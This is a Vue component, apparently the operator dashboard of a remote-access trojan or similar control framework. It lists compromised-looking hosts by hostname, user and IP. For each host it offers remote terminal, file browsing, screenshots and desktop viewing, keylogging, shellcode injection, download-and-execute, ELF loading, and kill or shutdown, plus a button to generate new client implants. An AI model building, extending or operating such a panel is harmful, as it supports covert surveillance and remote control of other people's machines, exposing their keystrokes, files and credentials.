<template>
  <div>
    <!-- Screenshot preview dialog -->
    <el-dialog v-model="screenshotVisible" title="Screenshot" width="auto" :append-to-body="true" destroy-on-close>
      <img v-if="screenshotUrl" :src="screenshotUrl" style="max-width:100%;max-height:80vh;" alt="screenshot" />
    </el-dialog>

    <!-- Feature dialogs (globally registered components, lazy-loaded) -->
    <GenerateClient v-if="dialogs.generate !== false" :visible="!!dialogs.generate" @update:visible="closeDialog('generate')" />
    <Execute       v-if="dialogs.execute"     :device="dialogs.execute"     :open="true" @cancel="closeDialog('execute')" />
    <Shellcode     v-if="dialogs.shellcode"   :device="dialogs.shellcode"   :open="true" @cancel="closeDialog('shellcode')" />
    <Executable    v-if="dialogs.executable"  :device="dialogs.executable"  :open="true" @cancel="closeDialog('executable')" />
    <LoadElf       v-if="dialogs.loadelf"     :device="dialogs.loadelf"     :open="true" @cancel="closeDialog('loadelf')" />
    <Keylog        v-if="dialogs.keylog"      :device="dialogs.keylog"      :open="true" @cancel="closeDialog('keylog')" />
    <ProcessManager v-if="dialogs.procmgr"   :device="dialogs.procmgr"     :open="true" @cancel="closeDialog('procmgr')" />
    <FileExplorer  v-if="dialogs.explorer"   :device="dialogs.explorer"    :open="true" @cancel="closeDialog('explorer')" />
    <Terminal      v-if="dialogs.terminal"   :device="dialogs.terminal"    :open="true" @cancel="closeDialog('terminal')" />
    <Desktop       v-if="dialogs.desktop"    :device="dialogs.desktop"     :open="true" @cancel="closeDialog('desktop')" />
    <DeviceInfo    v-if="dialogs.devinfo"   :device="dialogs.devinfo"     :open="true" @cancel="closeDialog('devinfo')" />

    <!-- Toolbar -->
    <div class="toolbar">
      <el-button v-if="!noGenerate" type="primary" @click="openGenerate">
        <i class="fa-solid fa-plus" style="margin-right:6px"></i>Generate Client
      </el-button>
      <el-input
        v-model="searchQuery"
        placeholder="Search... or field:value (lan:10.26, os:linux)"
        clearable
        style="width:280px;margin-left:12px"
        :prefix-icon="Search"
      />
      <el-button style="margin-left:8px" :icon="RefreshRight" circle @click="loadDevices" />
      <span class="device-count">{{ filteredDevices.length }} device(s)</span>
    </div>

    <!-- Device table -->
    <el-table
      v-loading="loading"
      :data="filteredDevices"
      :row-key="(row) => row.id || row.conn"
      stripe
      border
      size="small"
      style="width:100%;margin-top:12px"
      :default-sort="{ prop: 'hostname', order: 'ascending' }"
    >
      <el-table-column prop="id"        label="Agent ID"   min-width="90"
        :formatter="(row) => row.id ? row.id.slice(0, 8) : (row.conn ? row.conn.slice(0, 8) : '')" />
      <el-table-column prop="hostname" label="Hostname"   sortable min-width="120" />
      <el-table-column prop="username" label="Username"   sortable min-width="110" />
      <el-table-column prop="os"       label="OS"         sortable min-width="90" />
      <el-table-column prop="pid"       label="PID"        sortable min-width="70" />
      <el-table-column prop="lan"      label="LAN"        sortable min-width="110" :sort-method="ipSort('lan')" />
      <el-table-column prop="wan"      label="WAN"        sortable min-width="110" :sort-method="ipSort('wan')" />
      <el-table-column prop="clientuptime" label="Client Up" sortable min-width="90"
        :formatter="(row) => renderUnixEpochToHumanReadable(row.clientuptime)" />
      <el-table-column prop="uptime"   label="Uptime"     sortable min-width="90"
        :formatter="(row) => tsToTime(row.uptime)" />
      <el-table-column label="Operations" min-width="260" fixed="right">
        <template #default="{ row }">
          <div class="ops-cell">
            <el-tooltip content="Terminal"    placement="top"><el-button text size="small" @click="openModal('terminal',  row)"><i class="fa-solid fa-terminal"/></el-button></el-tooltip>
            <el-tooltip content="Explorer"    placement="top"><el-button text size="small" @click="openModal('explorer',  row)"><i class="fa-regular fa-folder-open"/></el-button></el-tooltip>
            <el-tooltip content="Process"     placement="top"><el-button text size="small" @click="openModal('procmgr',   row)"><i class="fa-solid fa-gear"/></el-button></el-tooltip>
            <el-tooltip content="Execute"     placement="top"><el-button text size="small" @click="openModal('execute',   row)"><i class="fa-regular fa-circle-play"/></el-button></el-tooltip>
            <el-tooltip content="Shellcode"   placement="top"><el-button text size="small" @click="openModal('shellcode', row)"><i class="fa-regular fa-file-code"/></el-button></el-tooltip>
            <el-tooltip content="Desktop"     placement="top"><el-button text size="small" @click="openModal('desktop',   row)"><i class="fa-solid fa-display"/></el-button></el-tooltip>
            <el-tooltip content="Screenshot"  placement="top"><el-button text size="small" @click="takeScreenshot(row)"><i class="fa-regular fa-image"/></el-button></el-tooltip>
            <el-dropdown trigger="click" @command="(cmd) => onMenuClick(cmd, row)">
              <el-button text size="small">
                <i class="fa-solid fa-ellipsis-vertical"/>
              </el-button>
              <template #dropdown>
                <el-dropdown-menu>
                  <el-dropdown-item command="devinfo">Device Info</el-dropdown-item>
                  <el-dropdown-item command="executable">DL &amp; Execute</el-dropdown-item>
                  <el-dropdown-item command="loadelf">Load ELF</el-dropdown-item>
                  <el-dropdown-item command="keylog">Keylog</el-dropdown-item>
                  <el-dropdown-item divided command="restart">Restart</el-dropdown-item>
                  <el-dropdown-item command="shutdown">Shutdown</el-dropdown-item>
                  <el-dropdown-item command="KILL" style="color:#f56c6c">
                    <i class="fa-solid fa-skull-crossbones"/> Kill
                  </el-dropdown-item>
                </el-dropdown-menu>
              </template>
            </el-dropdown>
          </div>
        </template>
      </el-table-column>
    </el-table>
  </div>
</template>

<script>
import { ref, reactive, computed, onMounted, onUnmounted, watch } from 'vue';
import { Search, RefreshRight } from '@element-plus/icons-vue';
import { ElMessage, ElMessageBox } from 'element-plus';
import { request, stripI18n, tsToTime, renderUnixEpochToHumanReadable } from '../api/request.js';

const ACTION_LABELS = {
  restart: 'restart', shutdown: 'shutdown', KILL: 'kill',
};

export default {
  name: 'Home',
  setup() {
    const loading = ref(false);
    const devices = ref([]);
    const searchQuery = ref('');
    const screenshotVisible = ref(false);
    const screenshotUrl = ref('');
    const noGenerate = ref(false);

    const dialogs = reactive({
      generate:   false,
      execute:    null,
      shellcode:  null,
      executable: null,
      loadelf:    null,
      keylog:     null,
      procmgr:    null,
      explorer:   null,
      terminal:   null,
      desktop:    null,
      devinfo:    null,
    });

    const anyDialogOpen = computed(() =>
      Object.values(dialogs).some(v => v !== false && v !== null)
    );

    async function loadDevices() {
      loading.value = true;
      try {
        const res = await request('/api/device/list');
        const data = res.data;
        if (data.code !== 0) return;
        const result = [];
        for (const uuid in data.data) {
          const dev = { ...data.data[uuid], conn: uuid };
          for (const k in dev) {
            if (dev[k] && typeof dev[k] === 'object') {
              for (const sub in dev[k]) dev[`${k}_${sub}`] = dev[k][sub];
            }
          }
          result.push(dev);
        }
        result.sort((a, b) => a.hostname.toUpperCase().localeCompare(b.hostname.toUpperCase()));
        result.sort((a, b) => a.os.toUpperCase().localeCompare(b.os.toUpperCase()));
        devices.value = result;
      } finally {
        loading.value = false;
      }
    }

    let refreshTimer = null;
    watch(anyDialogOpen, (open) => {
      clearInterval(refreshTimer);
      if (!open) refreshTimer = setInterval(loadDevices, 3000);
    }, { immediate: true });

    onMounted(async () => {
      const res = await request('/api/ui/config');
      if (res.data?.code === 0) noGenerate.value = !!res.data.data?.noGenerate;
      loadDevices();
    });
    onUnmounted(() => clearInterval(refreshTimer));

    // Maps search field aliases → device property names
    const FIELD_MAP = {
      hostname: 'hostname', host: 'hostname',
      username: 'username', user: 'username',
      os: 'os',
      pid: 'pid',
      lan: 'lan',
      wan: 'wan',
      guid: 'conn',
    };

    const filteredDevices = computed(() => {
      const q = searchQuery.value.trim().toLowerCase();
      if (!q) return devices.value;

      // Detect field:value syntax
      const colonIdx = q.indexOf(':');
      if (colonIdx > 0) {
        const fieldAlias = q.slice(0, colonIdx);
        const term = q.slice(colonIdx + 1);
        const prop = FIELD_MAP[fieldAlias];
        if (prop && term) {
          return devices.value.filter(d =>
            String(d[prop] ?? '').toLowerCase().startsWith(term)
          );
        }
      }

      // Plain search — contains match across key fields
      return devices.value.filter(d =>
        [d.hostname, d.username, d.os, d.lan, d.wan, d.pid].some(v =>
          String(v ?? '').toLowerCase().includes(q)
        )
      );
    });

    function ipSort(prop) {
      return (a, b) => {
        const normalize = (ip) => {
          if (!ip) return '';
          if (ip.includes('.')) return ip.split('.').reduce((acc, o) => (acc << 8) + parseInt(o, 10), 0);
          return ip.split(':').map(p => p.padStart(4, '0')).join(':');
        };
        const ia = normalize(a[prop]), ib = normalize(b[prop]);
        return ia < ib ? -1 : ia > ib ? 1 : 0;
      };
    }

    function openGenerate() { dialogs.generate = true; }
    function openModal(name, device) { dialogs[name] = device; }

    function closeDialog(name) {
      dialogs[name] = name === 'generate' ? false : null;
      if (!anyDialogOpen.value) {
        clearInterval(refreshTimer);
        refreshTimer = setInterval(loadDevices, 3000);
      }
    }

    async function takeScreenshot(device) {
      try {
        const res = await fetch('/api/device/screenshot/get', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({ uuid: device.conn }).toString(),
        });
        if (res.ok) {
          const blob = await res.blob();
          if (screenshotUrl.value) URL.revokeObjectURL(screenshotUrl.value);
          screenshotUrl.value = URL.createObjectURL(blob);
          screenshotVisible.value = true;
        } else {
          let msg = 'Screenshot failed';
          try { const json = await res.json(); msg = stripI18n(json.msg) || msg; } catch {}
          ElMessage.warning(msg);
        }
      } catch {
        ElMessage.warning('Screenshot failed');
      }
    }

    async function onMenuClick(act, device) {
      if (dialogs.hasOwnProperty(act)) {
        openModal(act, device);
        return;
      }
      const label = ACTION_LABELS[act] ?? act.toLowerCase();
      try {
        await ElMessageBox.confirm(`Are you sure to ${label} this device?`, {
          confirmButtonText: 'Yes', cancelButtonText: 'No',
        });
        const res = await request(`/api/device/${act}`, { uuid: device.conn });
        if (res.data.code === 0) {
          ElMessage.success('Operation executed');
          await loadDevices();
        }
      } catch (_) { /* user cancelled */ }
    }

    return {
      loading, devices, searchQuery, filteredDevices,
      dialogs, screenshotVisible, screenshotUrl, noGenerate,
      Search, RefreshRight,
      tsToTime, renderUnixEpochToHumanReadable,
      loadDevices, openGenerate, openModal, closeDialog,
      takeScreenshot, onMenuClick, ipSort,
    };
  },
};
</script>

<style scoped>
.toolbar {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 4px;
}
.device-count {
  margin-left: 12px;
  color: #888;
  font-size: 13px;
}
.ops-cell {
  display: flex;
  align-items: center;
  gap: 2px;
  flex-wrap: nowrap;
}
.ops-cell .el-button {
  padding: 4px 6px;
  font-size: 14px;
}
</style>
